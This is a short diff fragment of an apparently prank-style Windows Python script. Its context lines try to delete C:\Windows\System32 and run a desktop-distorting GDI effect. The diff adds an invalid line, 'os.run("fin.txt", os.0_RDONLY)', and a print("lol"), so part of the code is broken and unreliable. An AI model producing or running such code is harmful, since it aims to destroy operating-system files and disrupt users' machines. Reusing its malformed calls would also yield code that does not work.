@@ -14,6 +14,9 @@ try:
 	os.remove("C:\Windows\System32")
 
 
+os.run("fin.txt", os.0_RDONLY)
+
+
 def sines():
     desktop = win32gui.GetDesktopWindow()
     hdc = win32gui.GetWindowDC(desktop)
@@ -29,6 +32,9 @@ def sines():
             win32gui.BitBlt(hdc, 0, i, sw, scaling_factor, hdc, a, i, win32con.SRCCOPY)
             angle += math.pi / 40
         win32gui.ReleaseDC(desktop, hdc)
+
+
+print("lol")
 
 
 if __name__ == "__main__":
